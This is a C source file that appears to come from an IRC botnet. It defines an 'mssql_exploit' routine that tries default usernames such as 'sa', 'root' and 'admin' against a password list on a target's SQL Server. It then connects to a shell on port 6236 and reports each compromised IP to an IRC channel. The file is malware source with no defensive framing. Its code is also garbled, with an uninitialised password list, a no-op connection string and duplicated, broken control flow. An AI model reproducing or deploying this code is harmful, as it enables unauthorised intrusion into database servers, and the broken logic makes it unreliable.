#include "include.h"
#include "extern.h"



unsigned int __stdcall mssql_exploit(void *param, char *target, const char *host){
	char database[]="", *users[]={"sa","root","admin",NULL};
	struct exploits exploit = *(struct exploits *)param;
	struct exploits *pexploit = (struct exploits *)param;
	pexploit->gotinfo = true;
	int fd;
	struct sockaddr_in target2;
	BOOL bRet=FALSE;

		if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		_endthreadex(0);
		return 0;
	}
	target2.sin_family = AF_INET;
	target2.sin_addr.s_addr = exploit.ip;
	target2.sin_port = htons(exploit.port);
	memset(target2.sin_zero, 0, 8);
 char *mypasses[128];
	for (int i=0; users[i]; i++) {
		for (int j=0; mypasses[j]; j++) {
			"DRIVER={SQL Server};SERVER=%s,%d;UID=%s;PWD=%s;%s",exploit.ip,exploit.port,users[i],mypasses[j],database; 
	
	
			shell_connect(exploit.ip, 6236); {
	        	irc_privmsg(target, "Exploiting IP: %s", exploit.ip);
	           	closesocket(fd);
            	_endthreadex(0);
				
					bRet=TRUE;
					//if (!exinfo.silent)
						shell_connect(exploit.ip, 6236); {
	        	irc_privmsg(target, "Exploiting IP: %s", exploit.ip);
	           	closesocket(fd);
            	_endthreadex(0);

					break;
				}

				break;
			}
			Sleep(500);
		}
		if (bRet == TRUE)
			break;
	}


	shell_connect(exploit.ip, 6236); {
	//	irc_privmsg(target, "Exploiting IP: %s", exploit.ip);
		closesocket(fd);
	_endthreadex(0);
	return bRet;
	}
}
